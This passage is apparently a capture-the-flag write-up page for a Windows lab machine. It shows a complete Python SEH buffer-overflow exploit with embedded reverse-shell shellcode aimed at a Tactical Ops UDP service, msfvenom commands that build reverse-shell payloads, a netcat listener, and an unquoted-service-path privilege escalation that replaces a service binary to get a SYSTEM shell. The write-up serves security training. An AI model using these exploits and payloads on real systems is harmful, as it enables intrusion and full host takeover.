+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-26.png" data-desc-position="bottom"><img alt="" src="img/image-26.png"></a></p>
+<p>The note explains why the vulnerable service is not listening on the default Tactical Ops port used during exploit development. Instead, the exploit must target the UDP port exposed by the target machine.</p>
+<p>In addition, the reverse shell payload must be regenerated using the attacker's current IP address.</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP_ATTACK<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">EXECFUNC</span><span class="o">=</span>thread<span class="w"> </span>-f<span class="w"> </span>python<span class="w"> </span>-b<span class="w"> </span><span class="s1">'\x00\x5C'</span>
+</code></pre></div>
+<p>The newly generated shellcode replaces the previous payload used during local debugging.</p>
+<p>Finally, the exploit configuration is updated to target the remote host.</p>
+<p>After applying these changes, the exploit is ready to be executed against the target machine.</p>
+<blockquote>
+<p>Updated exploit</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'10.64.165.219'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">8778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="c1"># JMP SHORT +0x8 NOPNOP to fill the 4 bytes of nSEH</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xeb\x08\x90\x90</span><span class="s1">'</span>
+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span> <span class="o">*</span> <span class="mi">16</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xda\xd0\xbb\xc8\x65\xbf\x98\xd9\x74\x24\xf4\x5f</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x31\xc9\xb1\x52\x31\x5f\x17\x83\xc7\x04\x03\x97</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x76\x5d\x6d\xdb\x91\x23\x8e\x23\x62\x44\x06\xc6</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x53\x44\x7c\x83\xc4\x74\xf6\xc1\xe8\xff\x5a\xf1</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x7b\x8d\x72\xf6\xcc\x38\xa5\x39\xcc\x11\x95\x58</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x4e\x68\xca\xba\x6f\xa3\x1f\xbb\xa8\xde\xd2\xe9</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x61\x94\x41\x1d\x05\xe0\x59\x96\x55\xe4\xd9\x4b</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x2d\x07\xcb\xda\x25\x5e\xcb\xdd\xea\xea\x42\xc5</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xef\xd7\x1d\x7e\xdb\xac\x9f\x56\x15\x4c\x33\x97</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x99\xbf\x4d\xd0\x1e\x20\x38\x28\x5d\xdd\x3b\xef</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x1f\x39\xc9\xeb\xb8\xca\x69\xd7\x39\x1e\xef\x9c</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x36\xeb\x7b\xfa\x5a\xea\xa8\x71\x66\x67\x4f\x55</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xee\x33\x74\x71\xaa\xe0\x15\x20\x16\x46\x29\x32</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf9\x37\x8f\x39\x14\x23\xa2\x60\x71\x80\x8f\x9a</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x81\x8e\x98\xe9\xb3\x11\x33\x65\xf8\xda\x9d\x72</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xff\xf0\x5a\xec\xfe\xfa\x9a\x25\xc5\xaf\xca\x5d</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xec\xcf\x80\x9d\x11\x1a\x06\xcd\xbd\xf5\xe7\xbd</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x7d\xa6\x8f\xd7\x71\x99\xb0\xd8\x5b\xb2\x5b\x23</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x0c\x7d\x33\x94\x1e\x15\x46\xea\x8f\xba\xcf\x0c</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xc5\x52\x86\x87\x72\xca\x83\x53\xe2\x13\x1e\x1e</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x24\x9f\xad\xdf\xeb\x68\xdb\xf3\x9c\x98\x96\xa9</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x0b\xa6\x0c\xc5\xd0\x35\xcb\x15\x9e\x25\x44\x42</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf7\x98\x9d\x06\xe5\x83\x37\x34\xf4\x52\x7f\xfc</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x23\xa7\x7e\xfd\xa6\x93\xa4\xed\x7e\x1b\xe1\x59</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x2f\x4a\xbf\x37\x89\x24\x71\xe1\x43\x9a\xdb\x65</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x15\xd0\xdb\xf3\x1a\x3d\xaa\x1b\xaa\xe8\xeb\x24</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x03\x7d\xfc\x5d\x79\x1d\x03\xb4\x39\x2d\x4e\x94</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x68\xa6\x17\x4d\x29\xab\xa7\xb8\x6e\xd2\x2b\x48</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x0f\x21\x33\x39\x0a\x6d\xf3\xd2\x66\xfe\x96\xd4</span><span class="s2">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xd5\xff\xb2</span><span class="s2">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">padding</span> <span class="o">+</span>
+    <span class="n">buf</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">¶</a></h2>
+<p>A Netcat listener was started on the attacker's machine.</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>The updated exploit was executed against the target.</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py
+</code></pre></div>
+<p>After a few seconds, the reverse shell connected back successfully.</p>
+<div class="highlight"><pre><span></span><code>Microsoft Windows [Version 10.0.xxxxx]
+
+C:\Users\spike\TacticalOps\TacticalOps\System&gt;
+</code></pre></div>
+<p>Verifying the current user confirms successful remote code execution.</p>
+<div class="highlight"><pre><span></span><code>whoami
+pc-to\spike
+</code></pre></div>
+<p>The initial user flag can now be retrieved.</p>
+<div class="highlight"><pre><span></span><code>type C:\Users\spike\Desktop\user.txt
+</code></pre></div>
+<blockquote>
+<p>Reverse shell</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-27.png" data-desc-position="bottom"><img alt="alt text" src="img/image-27.png"></a></p>
+<blockquote>
+<p>User flag</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-29.png" data-desc-position="bottom"><img alt="alt text" src="img/image-29.png"></a></p>
+<p>Although arbitrary code execution has been achieved, the compromised account does not yet have administrative privileges. The next objective is to escalate privileges to <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">¶</a></h2>
+<h3 id="host-enumeration">Host Enumeration<a class="headerlink" href="#host-enumeration" title="Permanent link">¶</a></h3>
+<p>After obtaining an interactive shell as the low-privileged user, the next objective is to identify a suitable privilege escalation vector.</p>
+<p>To speed up the enumeration process, <strong>PowerUp</strong> from the PowerSploit framework was uploaded to the target.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-AllChecks</span>
+<span class="nb">Get-UnquotedService</span>
+</code></pre></div>
+<p>PowerUp performs several common Windows privilege escalation checks, including:</p>
+<ul>
+<li>Unquoted Service Paths</li>
+<li>Weak Service Permissions</li>
+<li>Writable Service Executables</li>
+<li>Registry Misconfigurations</li>
+<li>DLL Hijacking Opportunities</li>
+</ul>
+<blockquote>
+<p>PowerUp results</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-33.png" data-desc-position="bottom"><img alt="alt text" src="img/image-33.png"></a></p>
+<h3 id="verifying-directory-permissions">Verifying Directory Permissions<a class="headerlink" href="#verifying-directory-permissions" title="Permanent link">¶</a></h3>
+<p>Although PowerUp reports the vulnerable service, it is still necessary to verify that the current user has permission to write files into one of the directories searched by Windows.</p>
+<p>The permissions of the service directory were inspected using <code>icacls</code>.</p>
+<div class="highlight"><pre><span></span><code>icacls "C:\Program Files\TO Service"
+</code></pre></div>
+<p>The output confirms that the current user has <strong>Modify</strong> permissions over the service directory, making it possible to place a malicious executable in the vulnerable path.</p>
+<h3 id="understanding-the-vulnerability">Understanding the Vulnerability<a class="headerlink" href="#understanding-the-vulnerability" title="Permanent link">¶</a></h3>
+<p>The service executable path contains spaces and is not enclosed in quotation marks.</p>
+<div class="highlight"><pre><span></span><code>C:\Program Files\TO Service\TOService.exe
+</code></pre></div>
+<p>When Windows starts the service, it attempts to resolve the executable by searching each component of the path sequentially.</p>
+<div class="highlight"><pre><span></span><code>C:\Program.exe
+↓
+
+C:\Program Files\TO.exe
+↓
+
+C:\Program Files\TO Service\TOService.exe
+</code></pre></div>
+<p>If an attacker can place a malicious executable in one of the searched locations, Windows may execute it before reaching the legitimate service binary.</p>
+<blockquote>
+<p>Unquoted Service Path</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-32.png" data-desc-position="bottom"><img alt="alt text" src="img/image-32.png"></a></p>
+<h3 id="exploiting-the-service">Exploiting the Service<a class="headerlink" href="#exploiting-the-service" title="Permanent link">¶</a></h3>
+<p>PowerUp can automatically generate a suitable payload for the vulnerable service.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Write-ServiceBinary</span> <span class="n">-Name</span> <span class="n">TOService</span>
+</code></pre></div>
+<p>Alternatively, a custom payload can be generated and copied to the vulnerable location.</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>eth0<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>TOService.exe
+</code></pre></div>
+<p>The generated executable replaced the original service binary.</p>
+<p>After replacing the executable, the service was restarted.</p>
+<h3 id="restarting-the-service">Restarting the Service<a class="headerlink" href="#restarting-the-service" title="Permanent link">¶</a></h3>
+<p>Once the malicious binary was in place, the service was restarted.</p>
+<div class="highlight"><pre><span></span><code>sc stop "TO Service"
+sc start "TO Service"
+</code></pre></div>
+<p>A second reverse shell was immediately received, this time running as <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<h3 id="obtaining-system">Obtaining SYSTEM<a class="headerlink" href="#obtaining-system" title="Permanent link">¶</a></h3>
+<p>After restarting the vulnerable service, a second reverse shell was received.</p>
+<p>Verifying the security context confirms that the process is now running with <strong>SYSTEM</strong> privileges.</p>
+<div class="highlight"><pre><span></span><code>whoami
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nt authority\system
+</code></pre></div>
+<h3 id="root-flag">Root Flag<a class="headerlink" href="#root-flag" title="Permanent link">¶</a></h3>
+<p>With SYSTEM privileges obtained, the final flag can now be retrieved.</p>
+<div class="highlight"><pre><span></span><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre></div>
+<p>The final flag confirms complete compromise of the target machine.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
